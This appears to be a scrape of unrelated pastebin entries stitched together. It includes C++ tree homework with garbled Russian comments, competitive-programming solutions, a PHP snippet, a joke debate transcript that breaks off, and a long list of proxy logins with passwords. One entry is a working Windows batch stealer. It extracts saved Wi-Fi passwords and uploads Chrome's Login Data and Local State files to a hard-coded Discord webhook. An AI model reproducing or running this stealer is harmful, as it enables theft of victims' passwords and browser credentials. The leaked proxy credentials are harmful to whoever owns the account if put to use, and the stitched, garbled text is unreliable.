        else insert(root2, mas[i]); // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π —É–∑–µ–ª –≤ –ø–µ—Ä–≤–æ–µ –¥–µ—Ä–µ–≤–æ –ø–æ–∏—Å–∫–∞
    }
}


//–Ω–∞—Ö–æ–∂–¥–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —É–∑–ª–æ–≤
int count(const node* p)
{
    if (p == NULL) return 0;
    return 1 + count(p->left) + count(p->right);
}



// –≤—ã—Å–æ—Ç–∞ –¥–µ—Ä–µ–≤–∞
int height(const node* p)
{
    if (p == NULL) return 0;
    //–∏–Ω–∞—á–µ
    int h1 = height(p->left);//—Å—á–∏—Ç–∞–µ–º –≤—ã—Å–æ—Ç—É –ª–µ–≤–æ–≥–æ –ø–æ–¥–¥–µ—Ä–µ–≤–∞
    int h2 = height(p->right);//—Å—á–∏—Ç–∞–µ–º –≤—ã—Å–æ—Ç—É –ø—Ä–∞–≤–æ–≥–æ –ø–æ–¥–¥–µ—Ä–µ–≤–∞
    if (h1 >= h2) return h1 + 1;//–≤–æ–∑–≤—Ä–∞—â–∞–µ–º –≤—ã—Å–æ—Ç—É –±–æ–ª—å—à–µ–≥–æ –∏–∑ –Ω–∏—Ö+1 - —Ç–∞–∫ –∫–∞–∫ –¥–æ–±–∞–≤–ª—è–µ–º –Ω–∞—à —É–∑–µ–ª
    return h2 + 1;
}



//–ø–µ—á–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–π —É–∑–ª–æ–≤ –∏–∑ —Å–∞–º–æ–π –¥–ª–∏–Ω–Ω–æ–π –≤–µ—Ç–∫–∏
void printLong(const node* p)
{
    if (p != NULL)
    {
        printStudent(p->countries);
        int h1 = height(p->left);
        int h2 = height(p->right);
        if (h1 >= h2) printLong(p->left);
        else printLong(p->right);
    }
}



double sayminarea(const node *p ){
    if (p != NULL) // –µ—Å–ª–∏ –¥–µ—Ä–µ–≤–æ –Ω–µ –ø—É—Å—Ç–æ
    {

        double s1 = sayminarea(p->left); // –ø–µ—á–∞—Ç–∞–µ–º –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        double s2 = sayminarea(p->right); // –ø–µ—á–∞—Ç–∞–µ–º –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        return min(p->countries.area, min(s1, s2)); // –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –ø–ª–æ—â–∞–¥—å –ø–æ–¥–¥–µ—Ä–µ–≤—å–µ–≤.
    }

    return 100000000; //
}
int saymaxlevel(const node *p, string s){
    //height

    if (p != NULL) // –µ—Å–ª–∏ –¥–µ—Ä–µ–≤–æ –Ω–µ –ø—É—Å—Ç–æ
    {

        int s1 = saymaxlevel(p->left, s); // –ø–µ—á–∞—Ç–∞–µ–º –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        int s2 = saymaxlevel(p->right, s); // –ø–µ—á–∞—Ç–∞–µ–º –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
        if(p->countries.name[0] == s[0]){
            return max(height(p), max(s1, s2)); // –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –ø–ª–æ—â–∞–¥—å –ø–æ–¥–¥–µ—Ä–µ–≤—å–µ–≤
        }
        return max(s1, s2);
    }
    return 0 ;

}
int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    Countries* mas = NULL;//—É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –º–∞—Å—Å–∏–≤ —Ç–∏–ø–∞ –°—Ç—É–¥–µ–Ω—Ç
    unsigned int size = 0;
    inputMasFromKeyboard(mas, size);
    if (size) {

        node* root1 = NULL, * root2 = NULL; // –£–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ –∫–æ—Ä–µ–Ω—å –ø–µ—Ä–≤–æ–≥–æ –∏ –≤—Ç–æ—Ä–æ–≥–æ –¥–µ—Ä–µ–≤—å–µ–≤
        printMas(mas, size);
        cout << endl;

        createTrees(mas, size, &root1, &root2);

        cout << ""–†–∞—Å–ø–µ—á–∞—Ç–∫–∞ –ø–µ—Ä–≤–æ–≥–æ –¥–µ—Ä–µ–≤–∞ –≤ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ"" << endl;
        printsim(root1); // —Ä–∞—Å–ø–µ—á–∞—Ç–∫–∞ –ø–µ—Ä–≤–æ–≥–æ –¥–µ—Ä–µ–≤–∞ –≤ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
        cout << endl;
        cout << ""–†–∞—Å–ø–µ—á–∞—Ç–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ –¥–µ—Ä–µ–≤–∞ –≤ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ"" << endl;
        printsim(root2); // —Ä–∞—Å–ø–µ—á–∞—Ç–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ –¥–µ—Ä–µ–≤–∞ –≤ —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
        cout << endl;
        cout << ""–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É–∑–ª–æ–≤ –ø–µ—Ä–≤–æ–≥–æ –¥–µ—Ä–µ–≤–∞ "" << count(root1) << endl;
        cout << endl;
        cout << ""–£–∑–ª—ã –¥–ª–∏–Ω–Ω–æ–π –≤–µ—Ç–∫–∏:"" << endl;
        printLong(root2);

        // ------------ –∑–∞–¥–∞—á–∞ 5--------------

        sayminarea(root1);
        // ------------ –∑–∞–¥–∞—á–∞ 6--------------
        saymaxlevel(root2, ""–ì""); // –≤—Ç–æ—Ä–æ–µ –¥–µ—Ä–µ–≤–æ , –∏—â–µ–º –≤—ã—Å–æ—Ç—É –Ω–∞—á–∏–Ω–∞—é—â–µ–≥–æ—Å—è —Å ""–ì""


        // ------------ –∑–∞–¥–∞—á–∞ 7--------------

        clear(&root1); //–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—á–∏—Å—Ç–∫–∏ –¥–µ—Ä–µ–≤–∞
        if (!root1) cout << ""–î–µ—Ä–µ–≤–æ —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω–æ!"" << endl;
        clear(&root2); //–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—á–∏—Å—Ç–∫–∏ –¥–µ—Ä–µ–≤–∞
        if (!root2) cout << ""–î–µ—Ä–µ–≤–æ —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω–æ!"" << endl;




        delete[] mas;
    }
    else cout << ""–†–∞–∑–º–µ—Ä –º–∞—Å—Å–∏–≤–∞ —Ä–∞–≤–µ–Ω 0"" << endl;
    return 0;
}
"
1h7JkyBm,BuilderJson,cepxuozab,C++,Thursday 27th of June 2024 11:00:07 PM CDT,"#include <iostream>
#include <map>
#include <set>
#include <string>

class Json { };

class Builder {
    class BaseContext;
    class DictValueContext;
    class ArrayItemContext;
public:
    Builder()=default;
    DictValueContext StartDict();
    ArrayItemContext StartArray();
    BaseContext EndDict();
    BaseContext EndArray();

private:
    Json* json;
    class BaseContext {
    public:
        BaseContext(Builder& builder)
            : builder_(builder)
        {
        }
        DictValueContext StartDict() {
            return builder_.StartDict();
        }
        ArrayItemContext StartArray() {
            return builder_.StartArray();
        }
        BaseContext EndDict() {
            return builder_.EndDict();
        }
        BaseContext EndArray() {
            return builder_.EndArray();
        }

    private:
        Builder& builder_;
    };

    class DictValueContext : public BaseContext {
    public:
        DictValueContext(BaseContext base)
            : BaseContext(base)
        {
        }
        BaseContext EndArray() = delete;
        DictValueContext StartDict() = delete;
        ArrayItemContext StartArray() = delete;
    };

    class ArrayItemContext : public BaseContext {
    public:
        ArrayItemContext(BaseContext base) : BaseContext(base) {}        
        BaseContext EndDict() = delete;
    };
};

Builder::DictValueContext Builder::StartDict() {
    return BaseContext{ *this };
}

Builder::ArrayItemContext Builder::StartArray() {   
    return BaseContext{ *this };
}

Builder::BaseContext Builder::EndDict() {    
    return *this;
}

Builder::BaseContext Builder::EndArray() {
        return *this;
}

int main(){
    auto doc = Builder().StartArray().EndDict();
}
"
wJ86fHhy,enviar_wifi_webhook,eneko42,Batch,Thursday 27th of June 2024 10:28:54 PM CDT,"@echo off
setlocal enabledelayedexpansion

rem URL de la webhook de Discord
set webhook_url=https://discord.com/api/webhooks/1248264179861946529/0NJ9hbaDTsksrOfOZK7Kcl-od6eEs_aEKIyQc3EVtjgJ-ThYcADYG4Ms9e926ugrcHlI

rem Crear un archivo temporal para el contenido JSON
set temp_json=temp.json

rem Enviar mensaje inicial
echo {^""content^"":^""**__-----Extrayendo Datos-----__**^""} > %temp_json%
curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!

rem Enviar mensaje de inicio de extracci√≥n de redes WiFi
echo {^""content^"":^""**__REDES WIFI GUARDADAS:__**^""} > %temp_json%
curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!

rem Obtener la lista de perfiles de red
for /f ""tokens=2 delims=:"" %%i in ('netsh wlan show profiles ^| findstr ""Perfil de todos los usuarios""') do (
    set profile=%%i
    set profile=!profile:~1!

    rem Obtener la contrase√±a de cada perfil
    for /f ""tokens=2 delims=:"" %%j in ('netsh wlan show profile name^=""!profile!"" key^=clear ^| findstr /C:""Contenido de la clave""') do (
        set key=%%j
        set key=!key:~1!
        set message=Nombre de perfil: !profile! Contrase√±a: !key!

        rem Escapar caracteres especiales
        set message=!message:^""=\""^""!

        rem Crear el contenido JSON en el archivo temporal
        echo {^""content^"":^""!message!^""} > %temp_json%

        rem Enviar el mensaje a la webhook de Discord
        curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!
    )
)

rem Eliminar el archivo temporal
del %temp_json%

rem Enviar archivos Login Data y Local State

rem Navegar al directorio del archivo Login Data
cd ""%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default""

rem Enviar el archivo Login Data a la webhook
curl --insecure -F ""file=@Login Data"" %webhook_url%

rem Navegar al directorio del archivo Local State
cd ..

rem Enviar el archivo Local State a la webhook
curl --insecure -F ""file=@Local State"" %webhook_url%

rem Mensaje de finalizaci√≥n
echo Proceso completado.
"
hUpynVcJ,random,Nolifeq,Python,Thursday 27th of June 2024 09:33:37 PM CDT,"eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plt69ymf6hkv0wdly3-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl6gvsuzy1uippqrzp-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pldwnv6s5u3dz972me-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl148iionc28dqhbg3-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pllucjnargelkpvatk-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plu8r2hc3t1w5r7ahp-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-ploer2ye67afqtc5r1-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plzw24wlud0u3cho5m-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plt415bx52vbmfnb8v-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plsi0znu5zytut41ea-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pltdfj6s1aroq0cokw-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plqlba0byn1rtnnl85-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plqyphlkdjnr81bydy-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plcpl5l6hwbxs1hke5-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plvx6rxpqpn99mlya5-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pln4qgd99elg8nak4b-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl47dpnpiqj5f5ozzx-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pljp56n1ryuaao8zk6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pltu17dmclk6z7l776-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plgz92xx3n88egldak-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plvfoz9ok8cazojr0z-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plhes43yj3l1jhuauf-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plwnij1ohxda1xiguj-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plyp4iayfsvhyo1d3f-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plg7tj8nqiyb5qllry-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plo6p05kge3h6c3a6n-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl9li2wmldmdnzqlot-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl4kqgx1cdv0c4zzn6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-ploewteruzpr6npw0j-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pletm8gcvxfr131cn6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl2jaw1k07j3rdx0zn-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plqqo3q4poz18t4klp-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pllxw7vsq4m7o0ww4k-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plxbkzex3eklog424g-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plhjs0tcnos3qogixm-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plata4afvu0e198srg-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plcxfgdpirt8wxoneb-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plg42cqbgia294kmom-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl69jpbcspdtx5le0e-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plgyrba5w0uprfcaoh-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plkk5g98kaa3bpc4x6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl6n9620sy13m2u3xv-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl2ulbpe3s0eqn63qx-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl0g39yrmqo3yzk9vv-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pltluvqjmgbmtqq386-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl9ue14idpk90rf9ci-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plhwm2i8oqrju04r9o-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plq6y8pom9goervscg-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plsbrghcrq54fj0766-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl6gz3nddzmdjxkp9x-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plmzumdrfsvkfv0rin-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plsvzm1aqy5ujc2eel-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plxv4zg50lk33s14jv-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plfiee5q93r6epqab5-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plfwirqfzs3fxc70iv-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl9wyj11vkt3w3a7b6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl46h6zo5jdblsm2ld-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plwjl0zhj03wn4oyhn-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plx4qlara7y3vdsfvg-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plq4rd5vjqu4ogp09x-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-ployzw072lhh4j1bgk-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plj53t6i7f9t8f29v0-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plgfbntgg7rw2dgsdw-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plyiojsm3fa33x4iyk-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plfwx8d1dkqthn04q8-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl30g6tbn9rwrp2dnx-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl9d750rjj66mioko5-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pltphvhwdkac1lsxod-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plhed2yquqqke0bmjb-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plbjtmyzchmu5n57ol-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl785xjidekry4n2hj-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl63booerm9hbvtwtg-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plrdj2pfivvm5fu698-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pljowmahfq5ji4lgcv-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl0zyp08x4kauoc7dy-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plhwd2t5xijmaqtxjt-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pli81v7fh64xzc8o70-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plbp6g39m44d7uo2cc-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plzg41go56b4429fqa-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plyo23rgjx5evgv3uo-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl0a0wuh7a6ncbqulz-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plho6jtx0uwv1ojg16-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plyuf43yu9tr1g0xgm-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plm1koyxcaznag9m0y-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pln2fmlgeb3xk3fjag-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plkj7s716jy0aqkr2q-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl57rkyqtkhtg243j1-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl1l9vrh51lo4jm3l1-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plzd4b08mej9oqxgqt-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl2xtvyjz7044lheub-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plixf72o1tys1f0x74-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plqhl5bjm5nix60ayf-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plkn46vzyet0bsvqkz-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plpwt14swx2ghfxiz6-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plh8icnotld3jain0s-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plpp6yjna7cyl0q08k-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plns1ppqidz06m3irk-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-plwpzxmh4vqx7muuav-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pltovvj0x039cz36yk-sesstime-1:KCGbkc
eu.cvsxtkwj.lunaproxy.net:12233:user-lu1860880-sessid-pl51cda71x03n0ju22-sesstime-1:KCGbkc
"
QppL9LQ0,add link in post title,arie_cristianD,PHP,Thursday 27th of June 2024 09:26:40 PM CDT,"<a href=""<?php the_field( 'external_link', get_the_ID(), false ); ?>"">
	<h1 class=""jeg_post_title""><?php the_title(); ?></h1>
</a>"
iJ3rB3aR,D,Ankit_132,C++,Thursday 27th of June 2024 09:07:46 PM CDT,"#include <bits/stdc++.h>
using namespace std;

#define ff first
#define ss second

int main() {
    int t;
    cin>>t;
    while(t--){
        int n, m; cin >> n >> m;
        vector<int> a(n), b(n);
        for(int &x:  a)
            cin >> x;
        map<int, pair<int, int>> diffs;
        map<int, int>  c;
        for(int i = 0; i < n; i++){
            cin >> b[i];
            if(diffs.find(a[i] - b[i]) != diffs.end())
            {
                if(b[i] < (diffs[a[i] - b[i]]).ff)
                    diffs[a[i] - b[i]] = {b[i], i};
            }
            else
                diffs[a[i] - b[i]] = {b[i], i};
        }
        vector<int> cc(m);
        for(int &x: cc){
            cin >> x;
            c[x]++;
        }

        int ans = 0;
        for(auto &[diff, temp] : diffs)
        {
            auto [bi, i] = temp;
            auto it = c.lower_bound(a[i]);

            while(it != c.end())
            {
                int cnt = (*it).second;
                int ci = (*it).first;
                int curr = (ci - bi)/(diff);            ans += 2*curr*cnt;
                c.erase(it);
                c[ci - curr*diff] += cnt;
                it = c.lower_bound(a[i]);
            }
        }
        cout << ans << endl;
    }
}
"
06bTgNwP,C,Ankit_132,C++,Thursday 27th of June 2024 09:07:43 PM CDT,"#include <bits/stdc++.h>
#define int long long
using namespace std;


signed main() {
  int t;
  cin >> t;
  while (t--) {
    int n;
    cin >> n;
    vector<int> a(n), b(n);
    for (int i = 0; i < n; i++) {
        cin >> a[i];
    }
    for (int i = 0; i < n; i++) {
        cin >> b[i];
    }
    int sa = 0, sb = 0, pos = 0, neg = 0;
    for (int i = 0; i < n; i++) {
        if (a[i] == 1 && b[i] == 1) pos++;
        else if (a[i] == -1 && b[i] == -1) neg++;
        else {
            if (a[i] >= b[i]) {
                sa += a[i];
            } else {
                sb += b[i];
            }
        }
    }
    while (pos--) {
        if (sa <= sb) sa++;
        else sb++;
    }
    while (neg--) {
        if (sa <= sb) sb--;
        else sa--;
    }
    cout << min(sa, sb) << ""\n"";
  }
}
"
KR50CSgx,B,Ankit_132,C++,Thursday 27th of June 2024 09:07:41 PM CDT,"#include <bits/stdc++.h>
using namespace std;
 
int main() {
    int t;
    cin>>t;
    while(t--){
        string s;
        cin>>s;
        string p;
        cin>>p;
        int n=s.length();
        int m=p.length();
        int ans=n+m;
        for(int i=0;i<m;i++){
            int ind=i;
            for(int j=0;j<n;j++){
                if(ind<m && s[j] == p[ind]) ind++;
            }
            ans=min(ans,n+m-ind+i);
        }
        
        cout<<ans<<endl;
    }
}"
b4kY1x0B,A,Ankit_132,C++,Thursday 27th of June 2024 09:06:05 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main() {
    int t;
    cin>>t;
    while(t--){
        int n;
        cin >> n;
        for(int i = 0; i < n; i++){
            int x, y;
            cin >> x >> y;
            if(y < - 1) cout << ""NO"" << endl;
            else cout << ""YES"" << endl;
        }
    }
}
"
bwhi4wPJ,TRIT: Deep Trap [2015],Munfaqqiha,C++,Thursday 27th of June 2024 07:24:33 PM CDT,"https://forum.idws.id/posts/34194002
https://idfl-forum.com/showthread.php?t=163104&p=3960203&viewfull=1#post3960203"
3UmZyiXp,Untitled,dmndkut,JavaScript,Thursday 27th of June 2024 07:19:17 PM CDT,"{
  ""transcript"": [
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""GOOD EVENING. FROM HOFSTRA UNIVERSITY, I'M LESTER HOLT. AND WELCOME TO THE FIRST PRESIDENTIAL DEBATE. A QUICK REMINDER FOR OUR AUDIENCE, THERE IS NO CHEERING, NO CLAPPING, AND TO THE TRUMP SUPPORTERS, NO SHIRT NO SHOES, NO SERVICE. NOW LET'S BRING OUT THE CANDIDATES. FIRST, SHE'S BEEN BATTLING PNEUMONIA AND WE HOPE SHE'S FEELING BETTER TONIGHT. IT'S SECRETARY HILLARY CLINTON.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I'M BETTER THAN EVER, LET'S DO THIS!""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""AND FINALLY, HE'S THE MAN TO BLAME FOR THE BOTTOM HALF OF ALL HIS KIDS' FACES. IT'S REPUBLICAN NOMINEE DONALD TRUMP!""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""GOOD EVENING, AMERICA. I AM GOING TO BE SO GOOD TONIGHT. I AM GOING TO BE SO CALM AND SO PRESIDENTIAL THAT ALL OF YOU WATCHING ARE GOING TO CREAM YOUR JEANS.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, LET'S BEGIN WITH YOU. WHY ARE YOU A BETTER CHOICE THAN YOUR OPPONENT TO CREATE JOBS AND PUT MONEY INTO THE POCKETS OF AMERICAN WORKERS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""WELL, LESTER, MY OPPONENT'S TAX PLAN BENEFITS THE TOP 1% SO MUCH, IT'S NOT JUST TRICKLE-DOWN ECONOMICS, IT'S -- I DON'T KNOW, I GUESS IF I HAD TO CALL IT SOMETHING OFF THE TOP OF THE OLD DOME, WITH NO PREP WHATSOEVER, I DON'T KNOW, I GUESS I'D CALL IT TRUMPED-UP, TRICKLE-DOWN ECONOMICS.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""THAT'S VERY CATCHY, SECRETARY. YOU JUST CAME UP WITH THAT JUST NOW?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
